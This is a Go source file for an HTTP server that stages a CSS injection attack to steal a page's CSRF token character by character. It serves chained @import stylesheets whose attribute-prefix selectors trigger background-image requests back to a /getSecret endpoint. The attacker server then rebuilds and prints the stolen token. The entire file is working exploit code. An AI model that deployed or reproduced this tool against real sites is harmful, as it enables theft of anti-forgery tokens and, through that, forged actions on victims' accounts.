package server

import (
	"fmt"
	"net/http"
	"strconv"
	"time"
)

var (
	TokenName  string
	TokenValue string
	ListOfChar string
	Verbose    bool
	TokenLen   int
)

func hello(rw http.ResponseWriter, req *http.Request) {
	if Verbose {
		fmt.Print("[Verbose] Request made to \"hello/\"\n")
	}

	var webpage string = "<html><input name=\"csrf\" value=\"test \\ test\" class=\"csrf\"><style> @import url(\"/launchAttack?len=" + strconv.Itoa(len(TokenValue)) + "\")</style></html>"

	fmt.Fprint(rw, webpage)
}

func getSecret(rw http.ResponseWriter, req *http.Request) {
	if Verbose {
		fmt.Print("[Verbose] Request made to \"getSecret/\"\n")
		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
	}

	//Get char from query
	param := req.URL.Query().Get("char")

	//If it exists, add it to the current token
	if param != "" {
		TokenValue += param
		fmt.Printf("%s = %s\n", TokenName, TokenValue)
	}

	rw.WriteHeader(http.StatusOK)
}

func attack(rw http.ResponseWriter, req *http.Request) {

	if Verbose {
		fmt.Print("[Verbose] Request made to \"attack/\"\n")
		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
	}

	//Create CSS that will make a request which will exfiltrate a new char from the token
	var css string = ""
	for _, ch := range ListOfChar {
		css += "input[name=" + TokenName + "][value^=\"" + TokenValue + string(ch) + "\"] "
		css += "{\n\tbackground-image: url(\"/getSecret?char=" + string(ch) + "\");\n}\n\n"
	}

	//add Inputs for space, \ and "
	css += "input[name=" + TokenName + "][value^=\"" + TokenValue + " \"]"
	css += "{\n\tbackground-image: url(\"/getSecret?char=%20\");\n}\n\n"
	css += "input[name=" + TokenName + "][value^=\"" + TokenValue + "\\\\\"]"
	css += "{\n\tbackground-image: url(\"/getSecret?char=\\\\\");\n}\n\n"
	css += "input[name=" + TokenName + "][value^=\"" + TokenValue + "\\\" \"]"
	css += "{\n\tbackground-image: url(\"/getSecret?char=%22\");\n}\n\n"

	//Send the response
	rw.Header().Set("Content-Type", "text/css")
	rw.WriteHeader(http.StatusOK)
	fmt.Fprint(rw, css)
}

func maliciousCSS(rw http.ResponseWriter, req *http.Request) {
	webpage := "@import url(\"/launchAttack?len=" + strconv.Itoa(len(TokenValue)) + "\") (max-width: 100000px);\n"

	//Send the response
	rw.Header().Set("Content-Type", "text/css")
	rw.WriteHeader(http.StatusOK)
	fmt.Fprint(rw, webpage)
}

func launchAttack(rw http.ResponseWriter, req *http.Request) {

	if Verbose {
		fmt.Print("[Verbose] Request made to \"launchAttack/\"\n")
		fmt.Printf("[Verbose] Query = %s\n", req.URL.Query())
	}

	//Get char index from query
	index := req.URL.Query().Get("len")
	nb, _ := strconv.Atoi(index)

	if TokenLen > nb {
		var webpage string = ""

		//Wait a little bit
		for nb > len(TokenValue) {
			time.Sleep(500000000)
			if Verbose {
				fmt.Printf("[Verbose] len = %d wake up\n", nb)
				fmt.Printf("[Verbose] len(TokenValue) = %d\n", len(TokenValue))
			}
		}

		//Create the CSS that will make two requests
		webpage += "@import url(\"/attack?len=" + index + "\") (max-width: 100000px);\n"
		webpage += "@import url(\"/launchAttack?len=" + strconv.Itoa(nb+1) + "\") (max-width: 100000px);\n"

		//Send the response
		rw.Header().Set("Content-Type", "text/css")
		rw.WriteHeader(http.StatusOK)
		fmt.Fprint(rw, webpage)

	}

}

func LaunchServer(port int) {

	fmt.Printf("Server launch on port %d\n", port)

	http.HandleFunc("/hello", hello)
	http.HandleFunc("/launchAttack", launchAttack)
	http.HandleFunc("/attack", attack)
	http.HandleFunc("/getSecret", getSecret)
	http.HandleFunc("/malicious.css", maliciousCSS)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)

}
